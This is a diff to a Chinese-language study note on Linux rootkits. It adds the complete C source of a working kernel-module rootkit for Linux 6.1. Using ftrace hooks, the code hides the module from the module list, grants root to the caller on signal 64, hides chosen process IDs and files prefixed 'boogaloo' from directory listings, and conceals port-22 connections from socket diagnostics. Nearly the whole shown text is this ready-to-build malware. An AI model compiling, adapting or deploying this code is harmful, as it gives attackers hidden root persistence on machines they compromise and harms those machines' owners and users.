@@ -1177,6 +1177,558 @@ EXPORT_SYMBOL(register_module_notifier);
 
 来实现，并通过传入过来的module对模块代码进行修改
 
+# 总的代码
+
+内核版本：Linux debian 6.1.0-23-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.99-1 (2024-07-15) x86_64 GNU/Linux
+
+```c
+#include <linux/module.h>
+#include <linux/init.h>
+#include <linux/kernel.h>
+#include <linux/version.h>
+#include <linux/namei.h>
+#include <linux/syscalls.h>
+#include <linux/ftrace.h>
+#include <linux/linkage.h>
+#include <linux/slab.h>
+#include <linux/uaccess.h>
+#include <linux/kprobes.h>
+#include <linux/mutex.h>
+#include <linux/dirent.h>
+#include <linux/netlink.h>
+#include <linux/inet_diag.h>
+
+#define PREFIX "boogaloo"
+
+static short hidden = 0;
+static char hide_pid[NAME_MAX] = {0};
+
+#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
+#define PTREGS_SYSCALL_STUBS 1
+#endif
+
+/// kallsyms_lookup_name
+static struct kprobe kp = {
+    .symbol_name = "kallsyms_lookup_name"
+};
+typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+static kallsyms_lookup_name_t my_kallsyms_lookup_name = NULL;
+static void* init_ksymbol(void)
+{
+
+    register_kprobe(&kp);
+    my_kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
+    unregister_kprobe(&kp);
+
+	return my_kallsyms_lookup_name;
+}
+
+void hideme(void)
+{
+    struct mutex *module_mutex = (struct mutex*)my_kallsyms_lookup_name("module_mutex");
+    if(module_mutex == NULL){
+        printk("rootkit:get module_mutex addr error\n");
+        return;
+    }
+
+    mutex_lock(module_mutex);
+
+    list_del(&THIS_MODULE->list);
+
+    mutex_unlock(module_mutex);
+
+}
+
+void showme(void)
+{
+    struct mutex *module_mutex = (struct mutex*)my_kallsyms_lookup_name("module_mutex");
+    struct list_head *modules = (struct list_head*)my_kallsyms_lookup_name("modules");
+
+    if(module_mutex == NULL){
+        printk("rootkit:get module_mutex addr error\n");
+        return;
+    }
+    if(modules == NULL){
+        printk("rootkit:get modules addr error\n");
+        return;
+    }
+
+    mutex_lock(module_mutex);
+
+    list_add(&THIS_MODULE->list,modules);
+
+    mutex_unlock(module_mutex);
+}
+
+void set_root(void)
+{
+    struct cred *root;
+    root = prepare_creds();
+
+    if(root == NULL)
+        return ;
+
+    root->uid.val = root->gid.val = 0;
+    root->euid.val = root->egid.val = 0;
+    root->suid.val = root->sgid.val = 0;
+    root->fsuid.val = root->fsgid.val = 0;
+    
+    commit_creds(root);
+}
+
+
+
+#ifdef PTREGS_SYSCALL_STUBS
+static asmlinkage long(*orig_mkdir)(const struct pt_regs *);
+asmlinkage int hook_mkdir(const struct pt_regs *regs)
+{
+	char __user *pathname = (char *)regs->di;
+	char dir_name[NAME_MAX] = {0};
+
+	long error = strncpy_from_user(dir_name,pathname,NAME_MAX);
+
+	if(error>0){
+		printk(KERN_INFO "rootkit:trying to create directory with name:%s\n",dir_name);
+	}
+
+	orig_mkdir(regs);
+	return 0;
+}
+
+static asmlinkage long (*orig_kill)(const struct pt_regs *);
+asmlinkage int hook_kill(const struct pt_regs *regs)
+{
+	int sig = (int)regs->si;
+    int pid = (int)regs->di;
+	if(sig == 64)
+	{
+		printk(KERN_INFO "rootkit: giving root ...\n");
+        set_root();
+		return 0;
+	}
+
+    if((sig == 63) && (hidden == 0)){
+        printk(KERN_INFO "rootkit: hiding rootkit!\n");
+        hideme();
+        hidden = 1;
+        return 0;
+    }
+    else if((sig == 63) && (hidden == 1)){
+        printk(KERN_INFO "rootkit: revealing rootkit!\n");
+        showme();
+        hidden = 0;
+        return 0;
+    }else if((sig == 62)){
+        printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
+        sprintf(hide_pid,"%d",pid);
+        return 0;
+    }
+
+	return orig_kill(regs);
+}
+static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
+asmlinkage ssize_t hook_getdents64(const struct pt_regs *regs)
+{
+    struct linux_dirent64 *dirp = (struct linux_dirent64 *)regs->si;
+    struct linux_dirent64 *dirp_kern = NULL;
+    struct linux_dirent64 *current_dirp = NULL;
+    struct linux_dirent64 *previous_dirp = NULL;
+    ssize_t offset = 0;
+
+    ssize_t ret = orig_getdents64(regs);
+
+    if(ret <= 0) return ret;
+
+    dirp_kern = kzalloc(ret,GFP_KERNEL);
+    
+    if(dirp_kern == NULL ) return ret;
+
+    if(copy_from_user(dirp_kern,dirp,ret)){
+        goto done;
+    }
+
+    while(offset < ret){
+        previous_dirp = current_dirp;
+        current_dirp = (struct linux_dirent64*)((char*)dirp_kern + offset);
+
+        if( (memcmp(PREFIX,current_dirp->d_name,strlen(PREFIX)) == 0) || 
+            ((memcmp(hide_pid,current_dirp->d_name,strlen(hide_pid)) == 0) && strlen(hide_pid)!=0 )
+        ){
+            printk(KERN_DEBUG "rootkit: Found %s\n", current_dirp->d_name);
+
+            if(previous_dirp == NULL){
+                ret -=  current_dirp->d_reclen;
+                memmove(current_dirp,(char*)current_dirp + current_dirp->d_reclen,ret);
+            }else{
+                previous_dirp->d_reclen += current_dirp->d_reclen;
+            }
+        }
+
+        offset += current_dirp->d_reclen;
+    }
+
+    if(copy_to_user(dirp,dirp_kern,ret)){
+        goto done;
+    }
+
+done:
+    kfree(dirp_kern);
+    return ret;
+}
+#else
+static asmlinkage long(*orig_mkdir)(const char __user *pathname,umode_t mode);
+asmlinkage int hook_mkdir(const char __user *pathname,umode_t mode)
+{
+	char dir_name[NAME_MAX] = {0};
+
+	long error = strncpy_from_user(dir_name,pathname,NAME_MAX);
+
+	if(error>0){
+		printk(KERN_INFO "rootkit:trying to create directory with name:%s\n",dir_name);
+	}
+
+	orig_mkdir(pathname,mode);
+	return 0;
+}
+
+static asmlinkage long (*orig_kill)(pid_t pid, int sig);
+asmlinkage int hook_kill(pid_t pid, int sig)
+{
+	if(sig == 64)
+	{
+		printk(KERN_INFO "rootkit: giving root ...\n");
+        set_root();
+		return 0;
+	}
+    
+    if((sig == 63) && (hidden == 0)){
+        printk(KERN_INFO "rootkit: hiding rootkit!\n");
+        hideme();
+        hidden = 1;
+        return 0;
+    }
+    else if((sig == 63) && (hidden == 1)){
+        printk(KERN_INFO "rootkit: revealing rootkit!\n");
+        showme();
+        hidden = 0;
+        return 0;
+    }else if((sig == 62)){
+        printk(KERN_INFO "rootkit: hiding process with pid %d\n", pid);
+        sprintf(hide_pid,"%d",pid);
+        return 0;
+    }
+
+	return orig_kill(pid,sig);
+}
+
+static asmlinkage long (*orig_getdents64)(int fd, void dir[.count], size_t count);
+asmlinkage ssize_t hook_getdents64(int fd, void dir[.count], size_t count)
+{
+    struct linux_dirent64 *dirp = (struct linux_dirent64 *)dir;
+    struct linux_dirent64 *dirp_kern = NULL;
+    struct linux_dirent64 *current_dirp = NULL;
+    struct linux_dirent64 *previous_dirp = NULL;
+    ssize_t offset = 0;
+
+    ssize_t ret = orig_getdents64(fd,dir,count);
+
+    if(ret <= 0) return ret;
+
+    dirp_kern = kzalloc(ret,GFP_KERNEL);
+    
+    if(dirp_kern == NULL ) return ret;
+
+    if(copy_from_user(dirp_kern,dirp,ret)){
+        goto done;
+    }
+
+    while(offset < ret){
+        previous_dirp = current_dirp;
+        current_dirp = (struct linux_dirent64*)((char*)dirp_kern + offset);
+
+        if( (memcmp(PREFIX,current_dirp->d_name,strlen(PREFIX)) == 0) || 
+            ((memcmp(hide_pid,current_dirp->d_name,strlen(hide_pid)) == 0) && strlen(hide_pid)!=0 )
+        ){
+            printk(KERN_DEBUG "rootkit: Found %s\n", current_dirp->d_name);
+
+            if(previous_dirp == NULL){
+                ret -=  current_dirp->d_reclen;
+                memmove(current_dirp,(char*)current_dirp + current_dirp->d_reclen,ret);
+            }else{
+                previous_dirp->d_reclen += current_dirp->d_reclen;
+            }
+        }
+
+        offset += current_dirp->d_reclen;
+    }
+
+    if(copy_to_user(dirp,dirp_kern,ret)){
+        goto done;
+    }
+
+done:
+    kfree(dirp_kern);
+    return ret;
+}
+#endif
+static void (*orig_tcp_diag_dump)(struct sk_buff *skb, struct netlink_callback *cb,
+			  const struct inet_diag_req_v2 *r);
+static void hook_tcp_diag_dump(struct sk_buff *skb, struct netlink_callback *cb,
+			  const struct inet_diag_req_v2 *r)
+{
+    orig_tcp_diag_dump(skb,cb,r);
+
+    struct nlmsghdr *current_nlh,*next_nlh;
+    struct inet_diag_msg *ids;
+    ssize_t offset = 0;
+
+    if(skb->len < sizeof(struct nlmsghdr)) return;
+
+    while(offset < skb->len){
+        current_nlh = (struct nlmsghdr *)(skb->data + offset);
+
+        if(offset + current_nlh->nlmsg_len < skb->len){
+            next_nlh = (void*)current_nlh + current_nlh->nlmsg_len;
+        }else{
+            next_nlh = NULL;
+        }
+
+        ids = nlmsg_data(current_nlh);
+        
+        if(ids->id.idiag_sport == htons(22)){
+            if(next_nlh == NULL){
+                skb->len -= current_nlh->nlmsg_len;
+                skb->tail -= current_nlh->nlmsg_len;
+            }else{
+                skb->len -= current_nlh->nlmsg_len;
+                skb->tail -= current_nlh->nlmsg_len;
+                memmove(current_nlh,next_nlh,skb->len - offset);
+            }
+        }else{
+            offset += current_nlh->nlmsg_len;
+        }
+    }
+}
+static ssize_t (*orig_random_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
+static ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter)
+{
+    return orig_random_read_iter(kiocb,iter);
+}
+
+#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
+#define PTREGS_SYSCALL_STUBS 1
+#endif
+
+/* x64 has to be special and require a different naming convention */
+#ifdef PTREGS_SYSCALL_STUBS
+#define SYSCALL_NAME(name) ("__x64_" name)
+#else
+#define SYSCALL_NAME(name) (name)
+#endif
+
+#define HOOK(_name, _hook, _orig)   \
+{                   \
+    .name = (_name),        \
+    .function = (_hook),        \
+    .original = (_orig),        \
+}
+
+/* We need to prevent recursive loops when hooking, otherwise the kernel will
+ * panic and hang. The options are to either detect recursion by looking at
+ * the function return address, or by jumping over the ftrace call. We use the 
+ * first option, by setting USE_FENTRY_OFFSET = 0, but could use the other by
+ * setting it to 1. (Oridinarily ftrace provides it's own protections against
+ * recursion, but it relies on saving return registers in $rip. We will likely
+ * need the use of the $rip register in our hook, so we have to disable this
+ * protection and implement our own).
+ * */
+#define USE_FENTRY_OFFSET 1
+#if !USE_FENTRY_OFFSET
+#pragma GCC optimize("-fno-optimize-sibling-calls")
+#endif
+
+/* We pack all the information we need (name, hooking function, original function)
+ * into this struct. This makes is easier for setting up the hook and just passing
+ * the entire struct off to fh_install_hook() later on.
+ * */
+struct ftrace_hook {
+    const char *name;
+    void *function;
+    void *original;
+
+    unsigned long address;
+    struct ftrace_ops ops;
+};
+
+/* Ftrace needs to know the address of the original function that we
+ * are going to hook. As before, we just use kallsyms_lookup_name() 
+ * to find the address in kernel memory.
+ * */
+static int fh_resolve_hook_address(struct ftrace_hook *hook)
+{
+    hook->address = my_kallsyms_lookup_name(hook->name);
+
+    if (!hook->address)
+    {
+        printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
+        return -ENOENT;
+    }
+
+#if USE_FENTRY_OFFSET
+    *((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
+#else
+    *((unsigned long*) hook->original) = hook->address;
+#endif
+
+    return 0;
+}
+
+/* See comment below within fh_install_hook() */
+static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *fregs)
+{
+    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
+    struct pt_regs *regs = ftrace_get_regs(fregs);
+#if USE_FENTRY_OFFSET
+    regs->ip = (unsigned long) hook->function;
+#else
+    if(!within_module(parent_ip, THIS_MODULE))
+        regs->ip = (unsigned long) hook->function;
+#endif
+}
+
+/* Assuming we've already set hook->name, hook->function and hook->original, we 
+ * can go ahead and install the hook with ftrace. This is done by setting the 
+ * ops field of hook (see the comment below for more details), and then using
+ * the built-in ftrace_set_filter_ip() and register_ftrace_function() functions
+ * provided by ftrace.h
+ * */
+int fh_install_hook(struct ftrace_hook *hook)
+{
+    int err;
+    err = fh_resolve_hook_address(hook);
+    if(err)
+        return err;
+    /* For many of function hooks (especially non-trivial ones), the $rip
+     * register gets modified, so we have to alert ftrace to this fact. This
+     * is the reason for the SAVE_REGS and IP_MODIFY flags. However, we also
+     * need to OR the RECURSION_SAFE flag (effectively turning if OFF) because
+     * the built-in anti-recursion guard provided by ftrace is useless if
+     * we're modifying $rip. This is why we have to implement our own checks
+     * (see USE_FENTRY_OFFSET). */
+    hook->ops.func = fh_ftrace_thunk;
+    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
+            | FTRACE_OPS_FL_RECURSION
+            | FTRACE_OPS_FL_IPMODIFY;
+
+    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
+    if(err)
+    {
+        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
+        return err;
+    }
+
+    err = register_ftrace_function(&hook->ops);
+    if(err)
+    {
+        printk(KERN_DEBUG "rootkit: register_ftrace_function() failed: %d\n", err);
+        return err;
+    }
+
+    return 0;
+}
+
+/* Disabling our function hook is just a simple matter of calling the built-in
+ * unregister_ftrace_function() and ftrace_set_filter_ip() functions (note the
+ * opposite order to that in fh_install_hook()).
+ * */
+void fh_remove_hook(struct ftrace_hook *hook)
+{
+    int err;
+    err = unregister_ftrace_function(&hook->ops);
+    if(err)
+    {
+        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
+    }
+
+    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+    if(err)
+    {
+        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
+    }
+}
+
+/* To make it easier to hook multiple functions in one module, this provides
+ * a simple loop over an array of ftrace_hook struct
+ * */
+int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
+{
+    int err;
+    size_t i;
+
+    for (i = 0 ; i < count ; i++)
+    {
+        err = fh_install_hook(&hooks[i]);
+        if(err)
+            goto error;
+    }
+    return 0;
+
+error:
+    while (i != 0)
+    {
+        fh_remove_hook(&hooks[--i]);
+    }
+    return err;
+}
+
+void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
+{
+    size_t i;
+
+    for (i = 0 ; i < count ; i++)
+        fh_remove_hook(&hooks[i]);
+}
+
+static struct ftrace_hook hooks[] = {
+	HOOK(SYSCALL_NAME("sys_mkdir"),hook_mkdir,&orig_mkdir),
+	HOOK(SYSCALL_NAME("sys_kill"),hook_kill,&orig_kill),
+    HOOK(SYSCALL_NAME("sys_getdents64"),hook_getdents64,&orig_getdents64),
+    HOOK("random_read_iter",hook_random_read_iter,&orig_random_read_iter),
+    HOOK("tcp_diag_dump",hook_tcp_diag_dump,&orig_tcp_diag_dump),
+};
+
+static int __init example_init(void)
+{
+	int err;
+	if(init_ksymbol() == NULL){
+		printk("get kallsyms_lookup_name error\n");
+		return -1;
+	}
+	
+	err = fh_install_hooks(hooks,ARRAY_SIZE(hooks));
+	if(err)
+		return err;
+	
+	printk(KERN_INFO"rootkit:loaded\n");
+	return 0;
+}
+
+static void __exit example_exit(void)
+{
+	fh_remove_hooks(hooks,ARRAY_SIZE(hooks));
+	printk(KERN_INFO"rootkit:unloaded\n");
+}
+
+module_init(example_init);
+module_exit(example_exit);
+MODULE_LICENSE("GPL");
+
+```
+
+
+
+
+
 # 参考资料
 
 awesome-linux-rootkits
